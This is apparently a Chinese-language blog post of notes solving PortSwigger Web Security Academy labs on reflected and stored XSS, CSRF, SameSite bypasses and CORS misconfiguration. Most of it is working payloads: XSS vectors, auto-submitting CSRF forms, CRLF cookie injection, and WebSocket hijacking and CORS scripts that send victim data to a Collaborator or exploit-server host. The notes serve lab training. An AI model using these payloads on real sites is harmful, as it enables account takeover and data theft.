+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	Reflected XSS into HTML context with all tags blocked except custom ones</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">爆破发现custom tags没有被waf拦截</span><br><span class="line">?search=&lt;hyy3029+<span class="built_in">id</span>%3Dx+onfocus%3Dalert%28document.cookie%<span class="number">29</span>%20tabindex=<span class="number">1</span>&gt;<span class="comment">#x</span></span><br><span class="line">静态页面查找 注意此处<span class="built_in">id</span>=x和<span class="comment">#x</span></span><br><span class="line">关于tabindex</span><br><span class="line">	https://blog.csdn.net/m0_37482190/article/details/<span class="number">103534903</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	Reflected XSS with some SVG markup allowed</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">爆破标签&lt;svg&gt;&lt;image&gt;&lt;title&gt;&lt;animatetransform&gt;</span><br><span class="line">&lt;svg&gt;&lt;animatetransform §§=<span class="number">1</span>&gt;</span><br><span class="line">爆破事件	onbegin</span><br><span class="line">&lt;svg&gt;&lt;animatetransform onbegin=alert(<span class="number">1</span>)&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	Reflected XSS in canonical link tag</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">?<span class="string">&#x27;accesskey=&#x27;</span>x<span class="string">&#x27;onclick=&#x27;</span>alert(<span class="number">1</span>)		单引号是闭合</span><br><span class="line">https://0a85002f037c98b980b1a3ac007700f3.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(<span class="number">1</span>)</span><br><span class="line">    然后按shift alt x</span><br><span class="line">accesskey浏览器定义快捷键</span><br><span class="line">	https://blog.csdn.net/SCHOLAR_II/article/details/<span class="number">6138630</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/portswigger/image-20230409220019406.png" alt="image-20230409220019406"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	Reflected XSS into a JavaScript string with single quote and backslash escaped</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">backslash 反斜杠</span><br><span class="line">&lt;/script&gt;&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line">闭合前面的&lt;script&gt;打破前端代码的结构 但是还是能跑...</span><br><span class="line">此处没有过滤&lt;&gt;</span><br><span class="line">encodeURIComponent() 函数可把字符串作为 URI 组件进行编码。</span><br><span class="line">	该方法不会对 ASCII 字母和数字进行编码，也不会对这些 ASCII 标点符号进行编码： - _ . ! ~ * <span class="string">&#x27; ( ) 。</span></span><br><span class="line"><span class="string">	其他字符（比如 ：;/?:@&amp;=+$,# 这些用于分隔 URI 组件的标点符号），都是由一个或多个十六进制的转义序列替换的。</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/portswigger/image-20230409194307882.png" alt="image-20230409194307882"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">输入&lt;&gt;<span class="string">&#x27;&quot;\ --&gt; &#x27;</span>&amp;lt;&amp;gt;&amp;apos;&amp;quot;\\</span><br><span class="line">\<span class="string">&#x27;;alert(1);// ---&gt; \\&#x27;</span>;alert(<span class="number">1</span>);//</span><br><span class="line">前端加断点调试比较快 直观</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/portswigger/image-20230409203241047.png" alt="image-20230409203241047"></p>
+<p><img src="/2023/07/25/portswigger/image-20230409203456534.png" alt="image-20230409203456534"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">评论区链接那里写http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>得到下面那个链接		隐藏的内容会显示出来</span><br><span class="line">于是构造http://foo?&amp;apos;-alert(<span class="number">1</span>)&amp;apos;		转译是为了绕开链接的限制</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/portswigger/image-20230409210338095.png" alt="image-20230409210338095"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">里面是个反引号 js执行了</span><br><span class="line">$&#123;alert(<span class="number">1</span>)&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/portswigger/image-20230409213456974.png" alt="image-20230409213456974"></p>
+<h3 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	CSRF vulnerability with no defenses</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">先写请求方式再同js去发送</span><br><span class="line">&lt;form method=<span class="string">&quot;POST&quot;</span> action=<span class="string">&quot;https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email&quot;</span>&gt;</span><br><span class="line">    &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;email&quot;</span> value=<span class="string">&quot;anything%40web-security-academy.net&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">        document.forms[<span class="number">0</span>].submit();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	CSRF where token validation depends on request method</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">换了请求方式</span><br><span class="line">&lt;form action=<span class="string">&quot;https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email&quot;</span>&gt;</span><br><span class="line">    &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;email&quot;</span> value=<span class="string">&quot;anything@web-security-academy.net&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">        document.forms[<span class="number">0</span>].submit();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	CSRF where token validation depends on token being present</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">csrf token删了</span><br><span class="line">bp生成须稍微改下提交</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)&lt;/script&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;https://0a37002b04606905819670eb00ab00ff.web-security-academy.net/my-account/change-email&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;email&quot;</span> value=<span class="string">&quot;123&amp;#64;12345R&quot;</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;script&gt;document.forms[<span class="number">0</span>].submit();&lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	CSRF where token is not tied to user session</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">csrf token操作一次就会变</span><br><span class="line">csrf token是通用的 没有绑定session</span><br><span class="line">bp生成csrf payload然后换成另一个人的</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	CSRF where token is tied to non-session cookie</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">用第二个账户进行抓包测试 一起修改csrf和cookie中的csrfkey值</span><br><span class="line">csrftoken没有绑定到session 绑了别的东西</span><br><span class="line">这样请求可以修改cookie中的内容</span><br><span class="line">SameSite=<span class="literal">None</span>：无论是否跨站都会发送 Cookie</span><br><span class="line">SameSite=Lax：容许局部第三方申请携带 Cookie</span><br><span class="line">SameSite=Strict：仅容许同站申请携带 Cookie，即以后网页 URL 与申请指标 URL 完全一致</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/portswigger/image-20230416191504899.png" alt="image-20230416191504899"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">修改url csrfkey csrf以及邮箱		其中csrfkey和csrf需要成对</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">&lt;img src=&quot;https://0aa600fe04abfcb78044c1e800440073.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=RswNtpop2DGmipkCCJxlDDgdwpG9xDBx%3b%20SameSite=None&quot; onerror=&quot;document.forms[0].submit()&quot;&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;https://0aa600fe04abfcb78044c1e800440073.web-security-academy.net/my-account/change-email&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;1&amp;#64;9&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;llLSrWHoNMsS75lylTQtFNtObqZRSHoW&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	CSRF where token is duplicated in cookie</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">这关是要cookie中的csrf和post传的csrf一致即可 不管它是啥</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)&lt;/script&gt;</span><br><span class="line">	&lt;img src=<span class="string">&quot;https://0a4b008304ea10f080cd9998007b00cc.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None&quot;</span> onerror=<span class="string">&quot;document.forms[0].submit();&quot;</span>/&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;https://0a4b008304ea10f080cd9998007b00cc.web-security-academy.net/my-account/change-email&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;email&quot;</span> value=<span class="string">&quot;1&amp;#64;52&quot;</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;csrf&quot;</span> value=<span class="string">&quot;fake&quot;</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	SameSite Lax bypass via method override</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">https://blog.csdn.net/qq_36690992/article/details/<span class="number">117965822</span></span><br><span class="line">SameSite	浏览器cookie</span><br><span class="line">	strict	跨站点时任何情况都不会发送cookie 只有网页url和请求目标一致才会带上cookie</span><br><span class="line">    lax		大多数情况除非导航到目标网址的GET请求(链接、预加载、GET表单)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/portswigger/1681649302658.png" alt="1681649302658"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">改成get请求	发现能执行</span><br><span class="line">	GET /my-account/change-email?email=4%404&amp;_method=POST</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    document.location = &quot;https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&amp;_method=POST&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	SameSite Strict bypass via client-side redirect</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">/login 			SameSite:strict</span><br><span class="line"></span><br><span class="line">get请求/post/comment		<span class="number">302</span>跳转</span><br><span class="line">		/post/comment/confirmation?postId=<span class="number">7</span>会调用隐藏js 如下图</span><br><span class="line">redirectOnConfirmation = (blogPath) =&gt; &#123;</span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">        const url = new URL(window.location);</span><br><span class="line">        const postId = url.searchParams.get(<span class="string">&quot;postId&quot;</span>);</span><br><span class="line">        window.location = blogPath + <span class="string">&#x27;/&#x27;</span> + postId;</span><br><span class="line">    &#125;, <span class="number">3000</span>);</span><br><span class="line">&#125;</span><br><span class="line">/post/comment/confirmation?postId=<span class="number">7</span> 这个请求把cookie删了也能请求</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    document.location = <span class="string">&quot;https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1&quot;</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/portswigger/1681654219251.png" alt="1681654219251"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	SameSite Strict bypass via sibling domain</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">WebSocket是一种在单个TCP连接上进行全双工通信的协议</span><br><span class="line">https://blog.csdn.net/godev/article/details/<span class="number">126547902</span></span><br><span class="line">	js onmessage事件，接受到消息后后触发，一般和函数搭配 window/websocket.onmessage=function(event)&#123;..&#125;...</span><br><span class="line">/chat	隐藏js /resources/js/chat.js</span><br><span class="line">proxy-&gt;websockets history</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var ws = new WebSocket(<span class="string">&#x27;wss://YOUR-LAB-ID.web-security-academy.net/chat&#x27;</span>);</span><br><span class="line">    ws.onopen = function() &#123;</span><br><span class="line">        ws.send(<span class="string">&quot;READY&quot;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    ws.onmessage = function(event) &#123;</span><br><span class="line">        fetch(<span class="string">&#x27;https://YOUR-COLLABORATOR-PAYLOAD.oastify.com&#x27;</span>, &#123;method: <span class="string">&#x27;POST&#x27;</span>, mode: <span class="string">&#x27;no-cors&#x27;</span>, body: event.data&#125;);</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">这个READY可以在隐藏js中找到</span><br><span class="line">这个发送的post包没有带出cookie 返回包存在SameSite:strict</span><br><span class="line"></span><br><span class="line">bp浏览历史中请求js和img返回包Access-Control-Allow-Origin显示cms-YOUR-LAB-ID.web-security-academy.net		sibling domain兄弟域名</span><br><span class="line">访问这个地址 登录框可以插入xss</span><br><span class="line">post请求转成get</span><br><span class="line">copy请求头到浏览器确保依旧可以访问</span><br><span class="line">https://cms-0a2f005a03e9365c8184848500dc00ed.web-security-academy.net/login?username=%3Cscript%3Ealert%<span class="number">281</span>%<span class="number">29</span>%3C%2Fscript%3E&amp;password=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">把username的value换成上面js脚本的url编码</span><br><span class="line">&lt;script&gt;</span><br><span class="line">location=<span class="string">&quot;https://cms-0a2f005a03e9365c8184848500dc00ed.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%32%66%30%30%35%61%30%33%65%39%33%36%35%63%38%31%38%34%38%34%38%35%30%30%64%63%30%30%65%64%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%70%63%35%67%7a%31%39%76%30%71%38%75%76%34%35%38%6b%63%6d%65%67%63%6c%67%66%37%6c%78%39%6d%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&amp;password=1&quot;</span></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">burp的dnslog会显示全部的websocket的聊天记录 聊天记录中存在账户密码</span><br><span class="line">location跳转到子域名xss，xss写攻击语句绕过SameSite:strict</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="cors"><a href="#cors" class="headerlink" title="cors"></a>cors</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	CORS vulnerability with basic origin reflection</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">/accountDetails</span><br><span class="line">	返回包 Access-Control-Allow-Credentials: true</span><br><span class="line">随便添加origin: https://www.baidu.com</span><br><span class="line">        </span><br><span class="line">payload需要登录状态太能生效！！！</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="keyword">var</span> req = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">	req.<span class="property">onload</span> = reqListener;</span><br><span class="line">	req.<span class="title function_">open</span>(<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;YOUR-LAB-ID.web-security-academy.net/accountDetails&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">    req.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span><br><span class="line">    req.<span class="title function_">send</span>();</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">reqListener</span>(<span class="params"></span>) &#123;</span><br><span class="line">        location=<span class="string">&#x27;/log?key=&#x27;</span>+<span class="variable language_">this</span>.<span class="property">responseText</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	CORS vulnerability with trusted null origin</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">Origin:null	--&gt;	Access-Control-Allow-Origin: null</span><br><span class="line">				Access-Control-Allow-Credentials: true</span><br><span class="line">  </span><br><span class="line">encodeURIComponent是为了不让 <span class="string">&quot; 出现去闭合前面的iframe的src的 &quot;</span></span><br><span class="line">&lt;iframe sandbox=<span class="string">&quot;allow-scripts allow-top-navigation allow-forms&quot;</span> srcdoc=<span class="string">&quot;&lt;script&gt;</span></span><br><span class="line"><span class="string">    var req = new XMLHttpRequest();</span></span><br><span class="line"><span class="string">    req.onload = reqListener;</span></span><br><span class="line"><span class="string">    req.open(&#x27;get&#x27;,&#x27;YOUR-LAB-ID.web-security-academy.net/accountDetails&#x27;,true);</span></span><br><span class="line"><span class="string">    req.withCredentials = true;</span></span><br><span class="line"><span class="string">    req.send();</span></span><br><span class="line"><span class="string">    function reqListener() &#123;</span></span><br><span class="line"><span class="string">        location=&#x27;exploit-server....net/log?key=&#x27;+encodeURIComponent(this.responseText);</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string">&lt;/script&gt;&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">需要https:// 两个地方都是</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
